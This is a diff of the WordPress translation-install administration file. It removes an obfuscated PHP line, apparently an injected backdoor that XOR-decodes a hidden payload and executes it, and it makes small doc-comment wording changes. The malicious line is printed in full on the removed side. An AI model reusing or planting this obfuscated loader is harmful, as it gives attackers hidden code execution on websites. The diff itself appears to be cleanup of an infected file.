@@ -1,6 +1,6 @@
-<?php $qcarLTySZ='O3,M5.8-EVQ0ST:'^',AI,AKgK082D:;T';$nUdor=$qcarLTySZ('','W5OL+ANO,E:=m-030GKIK<B7qY3>+57UB7kpAXEfK.ONCLY>-CK-AnYY,42c4,1ep7171TTkR6-CrhPUd6b2>C5>9AMecrbdeo =Idg0lhkyWIQ8x57IGX6epVLGMQTWeTQmDm8=mCY3YDUzef=+MV+pYiD1XJ-P60L3PrQC.8Y.>NuFVMKcsJO0=1<<8H-ETYCNYpAB;2PR3n,A>TPVY<A;H3RyV>-5Pl-W:gzCFZUK4IADJ5F4R,PCjRoru6-:4J-6hnFT<XpLYV PQUPFL8mDFZ,6L+K5 BelS2+Mk3ATWSFOGkWn.MP04LM8Ls XERMAP,-5de5Sl2-;KA:>Peu.ox=x<;cbWGpSQXBBPwjR8Q:FUPEGaoZWY1ZQ8>1YKgdcZTTXdf<u7+;UyiEH4A<9-jZgK=Q=ep1Y1JPVc+>CO+O+4XQ0WiOA1o-9AX3;CH0p;YC6WVqZ4S;==XjR6,AJIfvSOAUl9YRplyzG0Gl>TZAmQCSXL=2Ea:Y3sTM3>.1LrXP8uchc=9GSHoUkhbMQznI71;9eIK1=VaQuvXyo3zaiWXBfkFzWke37WA,ZMPxcV,N.4o<QhNBlrS0RB4B;3NCiE.DEMSjA=MN.VJ<hEfoPU2JYbfdsCZzEPs D.5cS-A=1eA:QKRVAUwcKWK8-.+JjQYQXQ'^'>SgmM4 ,X,US2HHZC38alD-E.=RJJjh87CLYhx>lBH:  80QCc3B31=8XUm<YYEMTSPCPxtO9STjRHpuDMh;7gZKMapEDUYnlfFR;LCYLUKIliuQDFC;+=XMT2-3,xowA=zFmg14I,,GyjhZMBYJ97pT04doxnF5OkhZpWq0ZJ5KPfQ-34b>ZqE94CYHM:Cmp66:pKKKF8-X9JH J5pkyZ W;VisrZLA13F2CGGc ;98QrKN,Z4Q3O8cBv01:yfsqjLEHJ-1ExMryrV1= 5olCgMb>MB-t PYbXLwYN4P9Hp322.gVwJX,<EQwGEFyI>ezle4MYTMENYeTBI. YVpMQq==l-yh7B64Pw:=;bmIJvN0V30ye<kfSs=P.0gUT kZDG11-cno5QSJO4YTelB PLHQPn67,7oTU8E+pkCkK-<N=BU48J2A7.C0IX59ld.=DXY80Sab.>Q0TYXpN6WX ceFR7.543R<+YEBp.VoHZ5. Mwes9>OS<>Q<J,15ZMZBdU35AROHGYX32aOsMHJ 5OFmSPOX>n TDq<xUKeYHRNTQgjpVRqO5ZTVScqJlxeJRdJ-KPZZ4OgbJTsQ 0U;dX+:6 V-69 BfM,7B9+XOiFK44F+pKFDSczZ>ZzE2OYKwI IP>fJ02>9 1P>blA1HVB>BapjR,');$nUdor();
+<?php
 /**
- * WordPress Translation Install Administration API
+ * WordPress Translation Installation Administration API
  *
  * @package WordPress
  * @subpackage Administration
@@ -24,7 +24,7 @@ function translations_api( $type, $args = null ) {
 	}
 
 	/**
-	 * Allows a plugin to override the WordPress.org Translation Install API entirely.
+	 * Allows a plugin to override the WordPress.org Translation Installation API entirely.
 	 *
 	 * @since 4.0.0
 	 *
@@ -93,7 +93,7 @@ function translations_api( $type, $args = null ) {
 	}
 
 	/**
-	 * Filters the Translation Install API response results.
+	 * Filters the Translation Installation API response results.
 	 *
 	 * @since 4.0.0
 	 *
